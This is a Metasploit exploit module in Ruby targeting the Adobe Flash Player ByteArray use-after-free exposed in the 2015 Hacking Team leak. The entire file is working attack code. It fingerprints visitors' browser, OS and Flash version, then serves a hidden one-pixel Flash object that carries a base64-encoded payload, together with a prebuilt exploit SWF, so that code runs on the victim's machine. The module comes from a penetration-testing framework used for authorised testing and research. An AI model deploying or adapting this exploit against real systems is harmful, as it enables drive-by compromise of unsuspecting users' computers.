##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking
 
  include Msf::Exploit::Remote::BrowserExploitServer
 
  def initialize(info={})
    super(update_info(info,
      'Name'                => 'Adobe Flash Player ByteArray Use After Free',
      'Description'         => %q{
        This module exploits an use after free on Adobe Flash Player. The vulnerability,
        discovered by Hacking Team and made public on its July 2015 data leak, was
        described as an Use After Free while handling ByteArray objects. This module has
        been tested successfully on:
 
        Windows XP, Chrome 43 and Adobe Flash 18.0.0.194,
        Windows 7 SP1 (32-bit), IE11 and Adobe Flash 18.0.0.194,
        Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 18.0.0.194,
        Windows 8.1 (32-bit), Firefox and Adobe Flash 18.0.0.194,
        Linux Mint "Rebecca" (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.468.
      },
      'License'             => MSF_LICENSE,
      'Author'              =>
        [
          'Unknown', # Someone from HackingTeam
          'juan vazquez' # msf module
        ],
      'References'          =>
        [
          ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/unpatched-flash-player-flaws-more-pocs-found-in-hacking-team-leak/'],
          ['URL', 'https://twitter.com/w3bd3vil/status/618168863708962816']
        ],
      'Payload'             =>
        {
          'DisableNops' => true
        },
      'Platform'            => ['win', 'linux'],
      'Arch'                => [ARCH_X86],
      'BrowserRequirements' =>
        {
          :source  => /script|headers/i,
          :arch    => ARCH_X86,
          :os_name => lambda do |os|
            os =~ OperatingSystems::Match::LINUX ||
              os =~ OperatingSystems::Match::WINDOWS_7 ||
              os =~ OperatingSystems::Match::WINDOWS_81 ||
              os =~ OperatingSystems::Match::WINDOWS_VISTA ||
              os =~ OperatingSystems::Match::WINDOWS_XP
          end,
          :ua_name => lambda do |ua|
            case target.name
            when 'Windows'
              return true if ua == Msf::HttpClients::IE || ua == Msf::HttpClients::FF || ua == Msf::HttpClients::CHROME
            when 'Linux'
              return true if ua == Msf::HttpClients::FF
            end
 
            false
          end,
          :flash   => lambda do |ver|
            case target.name
            when 'Windows'
              # Note: Chrome might be vague about the version.
              # Instead of 18.0.0.203, it just says 18.0
              return true if ver =~ /^18\./ && Gem::Version.new(ver) <= Gem::Version.new('18.0.0.194')
            when 'Linux'
              return true if ver =~ /^11\./ && Gem::Version.new(ver) <= Gem::Version.new('11.2.202.468')
            end
 
            false
          end
        },
      'Targets'             =>
        [
          [ 'Windows',
            {
              'Platform' => 'win'
            }
          ],
          [ 'Linux',
            {
              'Platform' => 'linux'
            }
          ]
        ],
      'Privileged'          => false,
      'DisclosureDate'      => 'Jul 06 2015',
      'DefaultTarget'       => 0))
  end
 
  def exploit
    @swf = create_swf
 
    super
  end
 
  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")
 
    if request.uri =~ /\.swf$/
      print_status('Sending SWF...')
      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})
      return
    end
 
    print_status('Sending HTML...')
    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})
  end
 
  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    target_payload = get_payload(cli, target_info)
    b64_payload = Rex::Text.encode_base64(target_payload)
    os_name = target_info[:os_name]
 
    if target.name =~ /Windows/
      platform_id = 'win'
    elsif target.name =~ /Linux/
      platform_id = 'linux'
    end
 
    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>" Play="true"/>
    </object>
    </body>
    </html>
    |
 
    return html_template, binding()
  end
 
  def create_swf
    path = ::File.join(Msf::Config.data_directory, 'exploits', 'hacking_team', 'msf.swf')
    swf =  ::File.open(path, 'rb') { |f| swf = f.read }
 
    swf
  end
end
